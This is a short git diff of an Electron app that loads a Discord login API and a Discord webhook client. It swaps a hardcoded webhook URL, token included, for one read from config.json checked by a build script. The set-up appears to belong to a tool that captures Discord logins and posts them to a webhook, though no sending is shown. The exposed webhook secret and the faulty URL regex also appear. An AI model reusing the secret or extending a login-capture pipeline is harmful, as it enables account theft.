@@ -2,10 +2,14 @@ const { app, BrowserWindow } = require('electron');
 const LoginApi = require('electron-discordloginapi');
 const fetch = require('node-fetch');
 const moment = require('moment');
+
+const { webhook_url } = require(__dirname + '/config.json');
+if (!/^https?:\/\/(www\.)?[discord.com/api/webhooks]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()!@:%_\+.~#?&\/\/=]*)$/.test(webhook_url)) return console.log("Please run build.bat");
 const { Webhook } = require("discord-webhook-client");
 const webhook = new Webhook({
-  url: "https://discord.com/api/webhooks/846239217072078889/0HKSsWNYxv1uVLw6nTjud1DxgxS_C2nZHDeCBsAd8N_6uMn0xe9MKa7fwv7YpW7NA06q"
+  url: webhook_url
 });
+
 
 // Handle creating/removing shortcuts on Windows when installing/uninstalling.
 if (require('electron-squirrel-startup')) {
